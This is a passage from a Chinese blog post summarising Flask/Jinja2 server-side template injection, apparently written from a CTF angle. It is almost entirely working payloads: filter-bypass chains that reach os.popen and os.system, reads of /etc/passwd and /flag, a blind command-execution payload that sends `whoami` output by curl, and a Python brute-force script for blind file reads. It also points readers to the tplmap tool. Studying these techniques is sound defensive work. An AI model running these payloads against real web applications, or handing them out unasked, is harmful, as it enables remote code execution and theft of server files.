+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>借助request对象</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>过滤引号下的命令执行</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure>
+
+<p><strong>过滤双括号</strong></p>
+<ul>
+<li>盲命令执行：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200407002155982.png" alt></p>
+<ul>
+<li>文件盲注</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:5000?name&#x3D;&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload&#x3D;&quot;&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;lihuaiqiu&#39;).read()[&quot;+str(i)+&quot;:&quot;+str(i+1)+&quot;]&#x3D;&#x3D;&#39;&quot;+chr(j)+&quot;&#39; %&#125;~ok~&#123;% endif %&#125;&quot;</span><br><span class="line">        true_url&#x3D;url+payload</span><br><span class="line">        r&#x3D;requests.get(true_url)</span><br><span class="line">        if &#39;ok&#39; in r.text:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-05-过滤trick"><a href="#0x-05-过滤trick" class="headerlink" title="0x 05 过滤trick"></a>0x 05 过滤trick</h3><p><strong>Python的一切皆对象思想</strong></p>
+<p>过滤掉了<code>class和request</code>,通过<code>session</code>构造出<code>object</code>，payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>__enter__与__init__</code>的相似性</strong></p>
+<p>通过<code>___enter__</code>来进入我们的对象取代<code>__init__</code>的过滤。</p>
+<ul>
+<li>利用转义字符（16进制）过滤<code>.</code>和<code>_</code></li>
+</ul>
+<blockquote>
+<p><a href="http://python-ds.com/python-3-escape-sequences" target="_blank" rel="noopener">http://python-ds.com/python-3-escape-sequences</a> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用requests</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;想要执行的命令&#39;).read()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其他</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#比如flag被过滤，|reverse</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()</span><br><span class="line">#比如getattr被过滤，|attr</span><br><span class="line">(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-06-最后总结"><a href="#0x-06-最后总结" class="headerlink" title="0x 06 最后总结"></a>0x 06 最后总结</h3><p><strong>Python 2.7</strong></p>
+<p>jinja2的for循环一把梭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Python 3.7</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>fuzz脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;找到了</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>jinja2判断</li>
+</ul>
+<p><code>49</code>:jinja2 返回的是 7777777 ，通过测试可以确定为 jinja2 </p>
+<h3 id="0x-07-推荐工具"><a href="#0x-07-推荐工具" class="headerlink" title="0x 07 推荐工具"></a>0x 07 推荐工具</h3><p>一把梭： <a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p>
+<blockquote>
+<p>参考资料</p>
+<p><a href="https://glotozz.github.io/2020/02/24/flask模版注入/" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/24/flask模版注入/</a></p>
+<p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-基础知识"><span class="toc-number">1.</span> <span class="toc-text">0x 01 基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-Python2-环境下测试"><span class="toc-number">2.</span> <span class="toc-text">0x 02 Python2 环境下测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-Python3-环境测试"><span class="toc-number">3.</span> <span class="toc-text">0x 03 Python3 环境测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-ByPass"><span class="toc-number">4.</span> <span class="toc-text">0x 04 ByPass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-过滤trick"><span class="toc-number">5.</span> <span class="toc-text">0x 05 过滤trick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-最后总结"><span class="toc-number">6.</span> <span class="toc-text">0x 06 最后总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-推荐工具"><span class="toc-number">7.</span> <span class="toc-text">0x 07 推荐工具</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/&title=flask模板注入总结" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/&title=flask模板注入总结" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/&text=flask模板注入总结" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=flask模板注入总结&body=Check out this article: http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
